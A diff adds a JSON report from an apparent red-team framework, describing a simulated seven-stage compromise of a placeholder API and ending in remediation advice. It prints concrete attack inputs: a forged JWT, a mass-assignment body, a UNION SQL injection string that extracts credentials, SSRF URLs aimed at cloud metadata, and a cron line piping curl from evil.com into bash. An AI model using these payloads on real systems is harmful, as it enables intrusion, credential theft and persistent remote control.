@@ -1,0 +1,378 @@
+{
+  "report_metadata": {
+    "run_id": "a9333f18",
+    "target": "https://api.example.com",
+    "objective": "full_compromise",
+    "generated_at": "2026-09-05T10:11:32.449755+00:00",
+    "framework_version": "1.0.0",
+    "disclaimer": "For authorized security testing and education only."
+  },
+  "execution_summary": {
+    "total_stages": 7,
+    "stages_succeeded": 7,
+    "stages_failed": 0,
+    "total_duration_ms": 0.0,
+    "chain_complete": true
+  },
+  "attack_chain": [
+    {
+      "stage": "BOLA",
+      "status": "success",
+      "duration_ms": 0.0,
+      "output": {
+        "accessible_ids": [
+          "user_1002",
+          "user_1003",
+          "user_1004",
+          "user_1005"
+        ],
+        "victim": "user_1002"
+      },
+      "error": null
+    },
+    {
+      "stage": "JWT Forgery",
+      "status": "success",
+      "duration_ms": 0.0,
+      "output": {
+        "forged_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAidXNlcl8xMDAyIiwgInJvbGUiOiAiYWRtaW4iLCAiaWF0IjogMTc4ODYwMzA5MiwgImV4cCI6IDE3ODg2MDY2OTJ9.signature_forged_via_alg_confusion",
+        "impersonated_user": "user_1002"
+      },
+      "error": null
+    },
+    {
+      "stage": "Mass Assignment",
+      "status": "success",
+      "duration_ms": 0.0,
+      "output": {
+        "role": "admin",
+        "permissions": [
+          "read",
+          "write",
+          "delete",
+          "admin"
+        ]
+      },
+      "error": null
+    },
+    {
+      "stage": "SQL Injection",
+      "status": "success",
+      "duration_ms": 0.0,
+      "output": {
+        "extracted": 2,
+        "db_type": "PostgreSQL"
+      },
+      "error": null
+    },
+    {
+      "stage": "SSRF",
+      "status": "success",
+      "duration_ms": 0.0,
+      "output": {
+        "internal_services": [
+          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "http://localhost:8080/actuator/env",
+          "http://10.0.0.1:6379/"
+        ]
+      },
+      "error": null
+    },
+    {
+      "stage": "Cloud Metadata",
+      "status": "success",
+      "duration_ms": 0.0,
+      "output": {
+        "iam_role": "admin-role",
+        "provider": "AWS"
+      },
+      "error": null
+    },
+    {
+      "stage": "Persistence",
+      "status": "success",
+      "duration_ms": 0.0,
+      "output": {
+        "mechanisms": 3
+      },
+      "error": null
+    }
+  ],
+  "evidence_collection": [
+    {
+      "stage": "BOLA",
+      "timestamp": "2026-09-05T10:11:32.449755+00:00",
+      "technique_id": "KC-001",
+      "mitre_technique": "T1078.004",
+      "severity": "high",
+      "description": "Enumerated 5 object IDs; 4 accessible via BOLA",
+      "artifacts": {
+        "target": "https://api.example.com",
+        "enumerated_ids": [
+          "user_1001",
+          "user_1002",
+          "user_1003",
+          "user_1004",
+          "user_1005"
+        ],
+        "accessible_ids": [
+          "user_1002",
+          "user_1003",
+          "user_1004",
+          "user_1005"
+        ],
+        "request": "GET /api/v1/users/user_1002/profile"
+      },
+      "iocs": [
+        "https://api.example.com/api/v1/users/user_1002",
+        "https://api.example.com/api/v1/users/user_1003",
+        "https://api.example.com/api/v1/users/user_1004"
+      ]
+    },
+    {
+      "stage": "JWT Forgery",
+      "timestamp": "2026-09-05T10:11:32.449755+00:00",
+      "technique_id": "KC-002",
+      "mitre_technique": "T1550.001",
+      "severity": "critical",
+      "description": "Forged JWT for user_1002 via RS256/HS256 algorithm confusion",
+      "artifacts": {
+        "original_alg": "RS256",
+        "forged_alg": "HS256",
+        "forged_header": {
+          "alg": "HS256",
+          "typ": "JWT"
+        },
+        "forged_payload": {
+          "sub": "user_1002",
+          "role": "admin",
+          "iat": 1788603092,
+          "exp": 1788606692
+        },
+        "forged_token_preview": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAidXNlcl8xMDAyIiwgInJvbGUiOiAiYWR..."
+      },
+      "iocs": [
+        "alg_confusion:HS256",
+        "victim:user_1002"
+      ]
+    },
+    {
+      "stage": "Mass Assignment",
+      "timestamp": "2026-09-05T10:11:32.449755+00:00",
+      "technique_id": "KC-003",
+      "mitre_technique": "T1068",
+      "severity": "critical",
+      "description": "Escalated to admin via mass assignment on PATCH /profile",
+      "artifacts": {
+        "endpoint": "PATCH /api/v1/profile",
+        "injected_fields": {
+          "role": "admin",
+          "is_admin": true
+        },
+        "full_payload": {
+          "name": "Attacker",
+          "email": "attacker@evil.com",
+          "role": "admin",
+          "is_admin": true,
+          "permissions": [
+            "read",
+            "write",
+            "delete",
+            "admin"
+          ]
+        },
+        "auth_header": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ..."
+      },
+      "iocs": [
+        "mass_assignment:role_injection",
+        "privesc:user_to_admin"
+      ]
+    },
+    {
+      "stage": "SQL Injection",
+      "timestamp": "2026-09-05T10:11:32.449755+00:00",
+      "technique_id": "KC-004",
+      "mitre_technique": "T1190",
+      "severity": "critical",
+      "description": "Extracted 2 credential sets via UNION-based SQLi",
+      "artifacts": {
+        "injection_point": "GET /api/v1/search?q=",
+        "payload": "1 UNION SELECT username,password_hash,email FROM users--",
+        "db_type": "PostgreSQL",
+        "extracted_rows": [
+          {
+            "username": "admin",
+            "password_hash": "sha256$7a3f...",
+            "email": "admin@example.com"
+          },
+          {
+            "username": "root",
+            "password_hash": "sha256$b9e2...",
+            "email": "root@example.com"
+          }
+        ]
+      },
+      "iocs": [
+        "sqli:union_based",
+        "exfil:credentials",
+        "db:postgresql"
+      ]
+    },
+    {
+      "stage": "SSRF",
+      "timestamp": "2026-09-05T10:11:32.449755+00:00",
+      "technique_id": "KC-005",
+      "mitre_technique": "T1190",
+      "severity": "critical",
+      "description": "SSRF reached cloud metadata service and 3 internal endpoints",
+      "artifacts": {
+        "entry_point": "POST /api/v1/fetch?url=",
+        "ssrf_payload": "http://169.254.169.254/latest/meta-data/",
+        "internal_services_reached": [
+          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "http://localhost:8080/actuator/env",
+          "http://10.0.0.1:6379/"
+        ],
+        "bypass_technique": "DNS_rebinding"
+      },
+      "iocs": [
+        "ssrf:cloud_metadata",
+        "ssrf:internal_network",
+        "bypass:dns_rebind"
+      ]
+    },
+    {
+      "stage": "Cloud Metadata",
+      "timestamp": "2026-09-05T10:11:32.449755+00:00",
+      "technique_id": "KC-006",
+      "mitre_technique": "T1552.005",
+      "severity": "critical",
+      "description": "Extracted cloud IAM credentials for role 'admin-role' via metadata SSRF",
+      "artifacts": {
+        "metadata_endpoint": "http://169.254.169.254/latest/meta-data/",
+        "iam_role": "admin-role",
+        "access_key_preview": "AKIAAAAA...",
+        "cloud_provider": "AWS",
+        "credential_type": "temporary_session_token"
+      },
+      "iocs": [
+        "cloud:aws",
+        "exfil:iam_credentials",
+        "iam_role:admin-role"
+      ]
+    },
+    {
+      "stage": "Persistence",
+      "timestamp": "2026-09-05T10:11:32.449755+00:00",
+      "technique_id": "KC-007",
+      "mitre_technique": "T1098",
+      "severity": "critical",
+      "description": "Established 3 persistence mechanisms",
+      "artifacts": {
+        "mechanisms": [
+          {
+            "type": "backdoor_account",
+            "username": "svc_backup",
+            "role": "admin",
+            "created_via": "cloud_creds"
+          },
+          {
+            "type": "cron_job",
+            "schedule": "*/5 * * * *",
+            "command": "curl https://evil.com/beacon | bash",
+            "host": "internal-server-01"
+          },
+          {
+            "type": "ssh_key",
+            "user": "root",
+            "key_fingerprint": "SHA256:abc123...",
+            "host": "10.0.0.5"
+          }
+        ],
+        "cloud_creds_used": "admin-role",
+        "cleanup_difficulty": "high"
+      },
+      "iocs": [
+        "persistence:backdoor_account",
+        "persistence:cron_job",
+        "persistence:ssh_key",
+        "c2:beacon"
+      ]
+    }
+  ],
+  "indicators_of_compromise": [
+    "sqli:union_based",
+    "persistence:cron_job",
+    "persistence:ssh_key",
+    "https://api.example.com/api/v1/users/user_1002",
+    "persistence:backdoor_account",
+    "https://api.example.com/api/v1/users/user_1004",
+    "https://api.example.com/api/v1/users/user_1003",
+    "db:postgresql",
+    "privesc:user_to_admin",
+    "victim:user_1002",
+    "iam_role:admin-role",
+    "exfil:iam_credentials",
+    "ssrf:internal_network",
+    "exfil:credentials",
+    "cloud:aws",
+    "alg_confusion:HS256",
+    "bypass:dns_rebind",
+    "c2:beacon",
+    "mass_assignment:role_injection",
+    "ssrf:cloud_metadata"
+  ],
+  "mitre_attack_mapping": [
+    "T1552.005",
+    "T1098",
+    "T1078.004",
+    "T1550.001",
+    "T1068",
+    "T1190"
+  ],
+  "risk_assessment": {
+    "overall_severity": "critical",
+    "attack_complexity": "low",
+    "privileges_required": "none",
+    "user_interaction": "none",
+    "impact": "full system compromise with persistence"
+  },
+  "remediation_recommendations": [
+    {
+      "title": "Fix BOLA / IDOR Vulnerabilities",
+      "description": "Implement object-level authorization checks on every request.",
+      "priority": "P0"
+    },
+    {
+      "title": "Harden JWT Validation",
+      "description": "Enforce algorithm whitelist; reject algorithm confusion attacks.",
+      "priority": "P0"
+    },
+    {
+      "title": "Prevent Mass Assignment",
+      "description": "Use DTOs with explicit allowlists; reject unexpected fields.",
+      "priority": "P0"
+    },
+    {
+      "title": "Remediate SQL Injection",
+      "description": "Use parameterized queries / ORM; implement input validation.",
+      "priority": "P0"
+    },
+    {
+      "title": "Mitigate SSRF",
+      "description": "Validate and sanitize URLs; block internal IP ranges; use allowlists.",
+      "priority": "P0"
+    },
+    {
+      "title": "Secure Cloud Metadata Access",
+      "description": "Use IMDSv2 with session tokens; restrict metadata access via network policies.",
+      "priority": "P0"
+    },
+    {
+      "title": "Remove Persistence Mechanisms",
+      "description": "Audit accounts, cron jobs, SSH keys; rotate all credentials; monitor for C2.",
+      "priority": "P0"
+    }
+  ],
+  "_integrity": "b8c19a69a11e9470"
+}
